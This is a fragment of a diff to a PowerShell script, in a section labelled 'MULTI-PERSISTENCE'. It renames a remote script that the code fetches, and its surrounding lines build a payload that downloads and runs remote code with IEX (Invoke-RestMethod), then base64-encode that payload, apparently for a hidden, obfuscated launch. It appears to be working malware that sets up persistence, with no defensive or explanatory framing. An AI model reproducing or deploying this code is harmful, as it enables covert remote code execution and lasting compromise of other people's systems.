@@ -105,7 +105,7 @@ try {
 } catch {}
 
 # === MULTI-PERSISTENCE ===
-$rawPath = "$($c.base)/update.ps1"
+$rawPath = "$($c.base)/deploy.ps1"
 $payload = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (Invoke-RestMethod -Uri '$rawPath')"
 $encBytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
 $encoded = [Convert]::ToBase64String($encBytes)
